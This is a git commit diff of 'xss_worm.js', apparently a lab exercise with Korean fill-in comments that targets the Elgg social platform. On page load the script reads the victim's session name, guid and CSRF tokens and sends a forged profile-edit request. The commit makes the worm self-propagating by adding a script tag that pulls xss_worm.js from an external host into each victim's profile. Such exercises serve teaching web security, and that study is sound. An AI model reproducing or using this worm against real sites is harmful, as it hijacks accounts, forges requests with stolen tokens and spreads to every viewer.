132996f4a6968117cffbb05e5229f88a4f7ef7b5
MJ <98680218+namminju@users.noreply.github.com>
2024-05-23 04:34:37 +0900

    Update xss_worm.js

--- xss_worm.js
+++ xss_worm.js
@@ -1,10 +1,9 @@
-
 window.onload=function(){
     var userName="&name="+elgg.session.user.name;
     var guid="&guid="+elgg.session.user.guid;
     var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
     var token="&__elgg_token="+elgg.security.token.__elgg_token;
-    var desc = encodeURIComponent("hacked"); // FILL IN 프로필에 입력될 내용
+    var desc = encodeURIComponent("hacked <script type='text/javascript' src='http://www.example.com/xss_worm.js'></script>"); // FILL IN 프로필에 입력될 내용에 스크립트 추가
     var content= "description=" + desc + userName + guid + ts + token; // FILL IN 리퀘스트 구성하는 매개변수 입력
     var sendurl = "/action/profile/edit"; // FILL IN
     var samygid= 49; //FILL IN
@@ -16,4 +15,3 @@ window.onload=function(){
         Ajax.send(content);
     }
 }
-
